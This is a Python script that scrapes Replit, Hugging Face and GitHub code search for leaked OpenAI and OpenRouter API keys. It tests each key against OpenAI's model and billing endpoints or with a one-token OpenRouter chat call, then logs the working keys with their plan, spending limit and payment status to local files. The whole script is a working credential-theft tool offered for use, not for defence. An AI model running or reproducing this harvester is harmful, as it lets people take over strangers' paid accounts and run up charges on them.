import asyncio
import aiohttp
import aiofiles
import requests
import sys
import re
import time
import os
import csv
import json
from dotenv import load_dotenv
from os.path import join, dirname
from openai import OpenAI

# Load .env file for GitHub API token and credentials file path
load_dotenv(verbose=True)
dotenv_path = join(dirname(__file__), '.env')
load_dotenv(dotenv_path)
CRED_LIST_FILEPATH = os.environ.get("CRED_LIST_FILEPATH")
GITHUB_API_TOKEN = os.environ.get("GITHUB_API_TOKEN")

# Validate environment variables
if CRED_LIST_FILEPATH is None:
    raise ValueError("CRED_LIST_FILEPATH is not set")
if GITHUB_API_TOKEN is None:
    raise ValueError("GITHUB_API_TOKEN is not set")

# Constants
OUTPUT_FILE = "keys.txt"
chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + [str(i) for i in range(10)]

# Global sets for keys
keys = set()
valid_keys = set()

# Regex pattern
key_regex = "sk-[a-zA-Z0-9]{48}"

# GitHub search page
github_page = 1

# GraphQL query for Replit
graphql_url = "https://replit.com/graphql"
with open("graphql/SearchPageSearchResults.graphql") as f:
    graphql_query = f.read()

# Headers for Replit GraphQL
graphql_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "x-requested-with": "XMLHttpRequest",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Referrer": "https://replit.com/search",
}

# Check if found_keys.csv exists and read known keys
known_keys = []
if os.path.exists("found_keys.csv"):
    with open("found_keys.csv") as f:
        reader = csv.DictReader(f)
        for row in reader:
            known_keys.append(row["key"])

# Function to perform search on Replit
async def perform_search(session, query, page, sort):
    payload = [{
        "operationName": "SearchPageSearchResults",
        "variables": {
            "options": {
                "onlyCalculateHits": False,
                "categories": ["Files"],
                "query": query,
                "categorySettings": {
                    "docs": {},
                    "files": {
                        "page": {
                            "first": 10,
                            "after": str(page)
                        },
                        "sort": sort,
                        "exactMatch": False,
                        "myCode": False
                    }
                }
            }
        },
        "query": graphql_query
    }]

    r = await session.post(graphql_url, headers=graphql_headers, json=payload)
    data = await r.json()
    search = data[0]["data"]["search"]
    if not "fileResults" in search:
        if "message" in search:
            print("Replit returned an error. Retrying in 5 seconds...")
            print(search["message"])
            await asyncio.sleep(5)
            return await perform_search(session, query, page, sort)
        return []
    file_results = search["fileResults"]["results"]["items"]
  
    found_keys = []
    for result in file_results:
        file_contents = result["fileContents"]
        matches = re.findall(key_regex, file_contents)
        found_keys += matches
    return list(set(found_keys))

# Function to validate key (combined validation for Replit and GitHub)
async def validate_key(session, key):
    validation_url = "https://api.openai.com/v1/models/gpt-4"
    subscription_url = "https://api.openai.com/v1/dashboard/billing/subscription"

    headers = {
        "Authorization": f"Bearer {key}"
    }
    r = await session.get(validation_url, headers=headers)

    if r.status_code == 401:
        return False  # Token revoked or invalid
    gpt_4 = r.status_code != 404
  
    subscription = await session.get(subscription_url, headers=headers)
    subscription_data = await subscription.json()
    expiration = subscription_data["access_until"]
    if expiration < time.time():
        return False  # Token expired
    hard_limit = subscription_data["hard_limit_usd"] or subscription_data["system_hard_limit_usd"]
    plan_id = subscription_data["plan"]["id"]
    payment_method = subscription_data["has_payment_method"]

    return {
        "key": key,
        "gpt4_allowed": gpt_4,
        "plan": plan_id,
        "limit": hard_limit,
        "payment_method": payment_method,
        "expiration": expiration
    }

# Function to log key to found_keys.csv
def log_key(key_info):
    exists = os.path.exists("found_keys.csv")
    with open("found_keys.csv", "a") as f:
        writer = csv.DictWriter(f, fieldnames=key_info.keys())
    
        if not exists:
            writer.writeheader()

        writer.writerow(key_info)

# Function to search all pages on Replit
async def search_all_pages(session, query):
    for page in range(1, 21):
        print(f"Checking page {page}...")
        keys = await perform_search(session, query, page, "RecentlyModified")
        print(f"Found {len(keys)} matches (not validated)")

        for key in keys:
            if key in known_keys:
                print(f"Found working key (cached): {key}")
                continue
      
            key_info = await validate_key(session, key)
            if not key_info:
                continue
      
            log_key(key_info)
            found_message = "Found working key: {key} (gpt4: {gpt4_allowed}, plan: {plan}, limit: {limit}, payment method: {payment_method}, expiration: {expiration})"
            print(found_message.format(**key_info))

# Function to get keys from Hugging Face
async def get_keys(session, char, i):
    pattern = r'(sk-\w)<\/span>([a-zA-Z0-9]{47})'
    url = f"https://huggingface.co/search/full-text?q=sk-{char}&limit=100&skip={i}"

    try:
        async with session.get(url) as response:
            response.raise_for_status()
            output = await response.text()

            key_list = re.findall(pattern, output)

            if key_list:
                for key in key_list:
                    complete_key = key[0] + key[1]
                    if complete_key not in keys:
                        print(f"Found key: {complete_key}")
                        keys.add(complete_key)
    except aiohttp.ClientResponseError as e:
        print(f"Error: {e}")

# Function to search GitHub code URLs
def search_github_code_urls(cur_page):
    query = 'sk-or-v1-'
    headers = {'Authorization': f'token {GITHUB_API_TOKEN}'}
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'page': cur_page}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        return map(lambda item: item['html_url'], response.json()['items'])
    else:
        print(f"Error: {response.status_code}")
        return None

# Function to extract credentials from HTML
def extract_credentials(html):
    pattern = r'sk-or-v1-[a-zA-Z0-9.-_]+[`"\'\n]'
    return map(lambda item: item[:-1], re.findall(pattern, html))

# Function to check key using OpenAI's client
def check_key(key):
    try:
        client = OpenAI(
            base_url="https://openrouter.ai/api/v1",
            api_key=key,
        )

        client.chat.completions.create(
            model="google/gemma-7b-it:nitro",
            messages=[
                {
                    "role": "system",
                    "content": "RETURN ONLY '0' AS YOUR ASSISTANT RESPONSE",
                }
            ],
            max_tokens=1,
            stream=False,
        )

        return True

    except Exception as e:
        print(e)
        return False

# Main function that orchestrates the combined search
async def main():
    async with aiohttp.ClientSession() as session:
        # Start Replit search
        if len(sys.argv) > 2:
            query = sys.argv[2]
        else:
            query = "sk- openai"
            print("Warning: search query not provided, falling back to hard coded default")
        await search_all_pages(session, query)

        # Start Hugging Face search
        await asyncio.gather(*[get_keys(session, char, i) for i in range(0, 11, 10) for char in chars])
        await asyncio.gather(*[validate_key(session, key) for key in keys])

        # Start GitHub search
        global github_page
        while True:
            html_urls = search_github_code_urls(github_page)
            if html_urls is None:
                print("No more results")
                break
            for url in html_urls:
                get_raw_url = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob', '')
                cur_html = requests.get(get_raw_url).text
                credentials = extract_credentials(cur_html)
                for cred in credentials:
                    if check_key(cred):
                        with open(CRED_LIST_FILEPATH, 'r') as f:
                            data = json.load(f)
                            if cred not in data['credentials']:
                                data['credentials'].append(cred)
                                with open(CRED_LIST_FILEPATH, 'w') as f:
                                    json.dump(data, f)
            github_page += 1

if __name__ == "__main__":
    asyncio.run(main())
